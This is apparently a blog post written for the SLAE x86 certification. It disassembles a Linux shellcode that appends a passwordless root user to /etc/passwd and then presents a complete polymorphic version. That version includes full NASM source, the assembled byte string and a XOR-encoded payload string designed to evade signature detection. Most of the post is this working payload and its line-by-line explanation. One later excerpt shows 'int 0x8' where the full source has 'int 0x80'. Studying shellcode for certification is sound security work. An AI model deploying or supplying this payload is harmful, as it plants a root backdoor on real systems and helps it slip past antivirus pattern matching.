---
title: "SLAE x86 Exam - Assignment #6 Part 2"
date: 2022-01-04
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - x86
  - assembly
  - nasm
  - c
  - exam
  - shellcode
  - polymorphism
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 6th assignment requires you to analyze 3 shellcodes from [Shell-Storm](http://shell-storm.org/shellcode/) and "create polymorphic versions of them to beat pattern matching".

There's only 1 constraint:

> The polymorphic versions cannot be larger 150% of the existing shellcode

I chose the following shellcodes:

1. [Linux/x86 - chmod 666 /etc/passwd & /etc/shadow - 57 bytes](http://shell-storm.org/shellcode/files/shellcode-812.php)
2. [Linux/x86 - append /etc/passwd & exit() - 107 bytes](http://shell-storm.org/shellcode/files/shellcode-561.php)
3. [Linux/x86 - iptables --flush - 43 bytes](http://shell-storm.org/shellcode/files/shellcode-825.php)

In this part I'll create a polymorphic version of the 2nd shellcode.

## Source code

The files for this part of the assignment are the following:

- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/original_shellcode.nasm)
- [polymorphic_shellcode.nasm]()

## Analysis

First, we need to analyse the original shellcode:

```bash
echo -n "\xeb\x38\x5e\x31\xc0\x88\x46\x0b\x88\x46\x2b\xc6\x46\x2a\x0a\x8d\x5e\x0c\x89\x5e\x2c\x8d\x1e\x66\xb9\x42\x04\x66\xba\xa4\x01\xb0\x05\xcd\x80\x89\xc3\x31\xd2\x8b\x4e\x2c\xb2\x1f\xb0\x04\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x74\x6f\x6f\x72\x3a\x3a\x30\x3a\x30\x3a\x74\x30\x30\x72\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x23" > shellcode.bin

ndisasm -b 32 -p intel shellcode.bin
```

Follows the output of `ndisasm`:

```nasm
                            ; Use the JMP-CALL-POP technique get a pointer to the string starting from address
                            ;   0000003A and ending at 00000069
                            ; the string is: /etc/passwd#toor::0:0:t00r:/root:/bin/bash #
00000000  EB38              jmp short 0x3a
00000002  5E                pop esi

                            ; clear the EAX register
00000003  31C0              xor eax,eax

                            ; replace the '#' character after '/etc/passwd'
                            ;   with a NULL byte
00000005  88460B            mov [esi+0xb],al

                            ; replace the '#' character after '/bin/bash '
                            ;   with a NULL byte
00000008  88462B            mov [esi+0x2b],al

                            ; replace the space after '/bin/bash'
                            ;   with a Line Feed (0x0a)
0000000B  C6462A0A          mov byte [esi+0x2a],0xa

                            ; store the pointer to 'toor::0:0:t00r:/root:/bin/bash'
                            ;   into EBX
0000000F  8D5E0C            lea ebx,[esi+0xc]

                            ; save the previous pointer after the following string:
                            ;   'toor::0:0:t00r:/root:/bin/bash\x0a\x00'
00000012  895E2C            mov [esi+0x2c],ebx

                            ; copy ESI into EBX
                            ;   it's pointing to the string "/etc/passwd"
00000015  8D1E              lea ebx,[esi]

                            ; 2nd argument of open():
                            ;   flags applied when opening the file:
                            ;     - O_APPEND
                            ;     - O_CREAT
                            ;     - O_RDWR
00000017  66B94204          mov cx,0x442

                            ; 3rd argument of open():
                            ;   mode (mode bits applied when a new file is created):
                            ;     - S_IRUSR
                            ;     - S_IWUSR
                            ;     - S_IRGRP
                            ;     - S_IROTH
0000001B  66BAA401          mov dx,0x1a4
```

I've learning something new while analysing this shellcode: that permissions bits in the Linux kernel's source code are represented with the [octal numeral system](https://en.wikipedia.org/wiki/Octal).

Let's look at an example. If you were to check the values for a constant like `O_CREAT` in the file `/include/uapi/asm-generic/fcntl.h`, you would find something like this:

```cpp
#define O_ACCMODE       00000003
#define O_RDONLY        00000000
#define O_WRONLY        00000001
#define O_RDWR          00000002

#ifndef O_CREAT
#define O_CREAT         00000100        /* not fcntl */
```

Initially I though the number was simply a decimal one. If not, maybe a hexadecimal number. Well, turns out that it's actually an octal one. So you need to convert the number from octal to hex (or decimal when writing your shellcode).

Another piece of advice. When using `strace`, you can pass the arguments `-e raw=open` to view the original, raw values, instead of the constants names.

Back to the shellcode. After the instructions above, the `open` syscall is called.

```nasm
                            ; invoke syscall open()
0000001F  B005              mov al,0x5
00000021  CD80              int 0x80
```

{% sidenote Use the `open()` syscall to open the file `/etc/passwd`, with flags %}

Now that the file is opened, it's time to write the new entry:

```nasm
                            ; 1st argument of write():
                            ;   file descriptor of the file want to write
00000023  89C3              mov ebx,eax
00000025  31D2              xor edx,edx

                            ; 2nd argument of write():
                            ;   pointer to the buffer containing the bytes to write
00000027  8B4E2C            mov ecx,[esi+0x2c]

                            ; 3rd argument of write():
                            ;   number of bytes to write: 31
0000002A  B21F              mov dl,0x1f

                            ; call syscall: write()
0000002C  B004              mov al,0x4
0000002E  CD80              int 0x80

                            ; call syscall: close()
00000030  B006              mov al,0x6
00000032  CD80              int 0x80

                            ; call syscall: exit()
00000034  B001              mov al,0x1
00000036  31DB              xor ebx,ebx
00000038  CD80              int 0x80

                            ; part of the JMP-CALL-POP technique
                            ; go back to the address 0x00000002
0000003A  E8C3FFFFFF        call 0x2

                            ; two strings referenced by the previous instructions
0000003F  2F                das
...       ...               ...
00000069  2023              and [ebx],ah
```

## Polymorphic shellcode

Follows the polymorphic version of the shellcode:

```nasm
; Author: Robert C. Raducioiu (rbct)
; Reference: http://shell-storm.org/shellcode/files/shellcode-561.php
; Shellcode: "\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75"
; Length: 123 bytes

global _start

section .text

_start:

    jmp short CallRunShellcode

RunShellcode:

    pop edi
    mov esi, edi

    xor ecx, ecx
    mul ecx

    mov cl, 11
    
DecodeStringBytes:
    
    xor DWORD [edi], 0x75636371

    add edi, 0x4
    loop DecodeStringBytes

OpenFile:

    mov edi, esi

    mov ebx, edi
    add ebx, 0xc

    push ebx
    pop esi

    push edi
    pop ebx

    mov al,0x6
    dec eax

    mov dl, 0x69
    rol edx, 2

    mov cx,0x443
    dec ecx

    int 0x80

AddMaliciousUser:

    xchg ebx,eax
    xor eax, eax

    push eax
    pop edx

    push 0x20
    pop edx
    dec edx

    push 0x3
    pop eax
    inc eax

    push esi
    pop ecx

    int 0x80

CloseFileHandle:

    xor eax, eax
    mov al,0x6
    int 0x80

Exit:

    inc eax
    int 0x80

CallRunShellcode:

    call RunShellcode
    EncodedStringBytes: db 0x5e,0x06,0x17,0x16,0x5e,0x13,0x02,0x06,0x02,0x14,0x07,0x75,0x05,0x0c,0x0c,0x07,0x4b,0x59,0x53,0x4f,0x41,0x59,0x17,0x45,0x41,0x11,0x59,0x5a,0x03,0x0c,0x0c,0x01,0x4b,0x4c,0x01,0x1c,0x1f,0x4c,0x01,0x14,0x02,0x0b,0x69,0x75
```

The size of the resulting shellcode is `123 bytes`, which means `115%` compared to the original shellcode. Since the majority of the bytes are completely different (e.g. the strings `/etc/passwd` and the new line added to the former), I think this is a good compromise.

### Analysis

Let's analyse the first two routines of the polymorphic shellcode:

```nasm
_start:

    jmp short CallRunShellcode

RunShellcode:

    pop edi
    mov esi, edi

    xor ecx, ecx
    mul ecx

    mov cl, 11
    
    ; ...

```

{% sidenote The assembly code in between has been omitted for clarity, in order to show the `JMP-CALL-POP` technique %}

```nasm
    ; ...

CallRunShellcode:

    call RunShellcode
    EncodedStringBytes: db 0x5e,0x06,0x17,0x16,0x5e,0x13,0x02,0x06,0x02,0x14,0x07,0x75,0x05,0x0c,0x0c,0x07,0x4b,0x59,0x53,0x4f,0x41,0x59,0x17,0x45,0x41,0x11,0x59,0x5a,0x03,0x0c,0x0c,0x01,0x4b,0x4c,0x01,0x1c,0x1f,0x4c,0x01,0x14,0x02,0x0b,0x69,0x75
```

Compared to the original shellcode, I'm still using the the `JMP-CALL-POP` technique. I decided against pushing all the bytes 4 DWORDS at a time, as that would require way more bytes (considering the XOR operations too).

I'm saving the pointer to the bytes referenced by `EncodedStringBytes` into the register `EDI` instead of `ESI`, in order to change the resulting bytes.

However, I had to use the register `ESI` too, because I would later use `EDX` for decoding the XOR-ed bytes.

The other instructions (`xor`, `mul`, and `mov`) weren't present in the original shellcode, but I needed them for the decoding stub.

Follows the next routine:

```nasm
DecodeStringBytes:
    
    ; XOR key: uccq
    xor DWORD [edi], 0x75636371

    ; now that the 4 bytes are decoded, step to the next 4 bytes
    add edi, 0x4

    ; repeat 11 times, if ECX == 0 don't loop
    loop DecodeStringBytes
```

The goal of the code above is to decode the encoded bytes, by XOR-ing one DWORD at a time with the key `0x75636371`. It doesn't hold any special meaning, it's just 4 random bytes that don't generate any NULL bytes during the XOR operations.

The `loop` instruction, used in conjunction with `mov cl, 11` from above, allow the shellcode to repeat the routine `DecodeStringBytes` 11 times, in order to decode the `44 encoded bytes` referenced by the variable `EncodedStringBytes`.

Follows the next routine, `OpenFile`:

```nasm
OpenFile:

    ; restore EDI to the original value
    ;   (pointing to the start of the decoded bytes)
    mov edi, esi

    ; store the pointer to 'toor::0:0:t00r:/root:/bin/bash\0x0a' into ebx
    mov ebx, edi
    add ebx, 0xc

    ; save the same pointer into ESI too
    push ebx
    pop esi

    ; store the pointer to '/etc/passwd' into EBX
    push edi
    pop ebx

    ; store 0x5 into EAX (syscall: open())
    mov al,0x6
    dec eax

    ; store the WORD 0x1a4 into EDX
    mov dl, 0x69
    rol edx, 2

    ; store the WORD 0x442 into ECX
    mov cx,0x443
    dec ecx

    ; call syscall 0x5: open()
    int 0x80
```

The first instructions are used by the shellcode for retrieving the pointers to the following decoded strings:

1. stored into the registers `EBX` and `EDI`: `/etc/passwd`
2. stored into the register `ESI`: `toor::0:0:t00r:/root:/bin/bash` (plus `0xa` at the end)

Compared to the original shellcode, I tried to restrict myself from directly moving bytes into registers, but instead using the `PUSH-POP` technique, as it requires the same number of bytes from what I've seen so far.

Moreover, I didn't want to use hard-coded values (`0x1a4` and `0x442`), so I simply used `DEC` and `ROL` to calculate the original values.

Next, there's the routing `AddMaliciousUser`, which appends the string `toor::0:0:t00r:/root:/bin/bash` to the previously-opened file, i.e. `/etc/passwd`:

```nasm
AddMaliciousUser:

    ; exchange EBX with EAX in order to save the
    ;   file descriptor of the file opened
    xchg ebx,eax

    ; clear EAX for later use
    xor eax, eax
    push eax
    pop edx

    ; save the DWORD 0x0000001f into EDX
    push 0x20
    pop edx
    dec edx

    ; save the DWORD 0x00000004 into EAX
    push 0x3
    pop eax
    inc eax

    ; get the pointer to `toor::0:0:t00r:/root:/bin/bash`
    ;   and save it into ECX
    push esi
    pop ecx

    ; call syscall write()
    int 0x80
```

Starting from the top, instead of using `mov ebx, eax` I chose to use an instruction I've rarely used up until now: `XCHG`, which exchanges the contents of the two registers.

Next, I've used the instruction `XOR`, `PUSH`, and `POP` in order to clear `EDX` and `EAX`.

Compared to the original shellcode, which simply clears `EDX` by means of the instruction `xor edx, edx`, mine clears `EAX` too, in order to avoid errors caused by the return value of `open()`.

Moreover, to make the shellcode more polymorphic and evade pattern matching, I used the `PUSH-POP` technique to set the desired values into the registers.

Below is the second-to-last Assembly routine:

```nasm
CloseFileHandle:

    xor eax, eax

    ; call syscall close()
    mov al,0x6
    int 0x8
```

It closes the file descriptor of the file `/etc/passwd`, opened before by means of the syscall `open()`. As before, I've explicitly cleared the `EAX` register in order to make the shellcode more stable. The rest is the same as the original shellcode.

Finally, the last routine:

```nasm
Exit:

    ; call syscall exit() 
    inc eax
    int 0x80
```

It terminates the execution. I chose not to clear `EAX` in order to save more bytes, but since this polymorphic version is simply `115%` bigger than the original size, you can just add a `xor eax, eax` before the `inc eax`, since it required only `1 byte`.
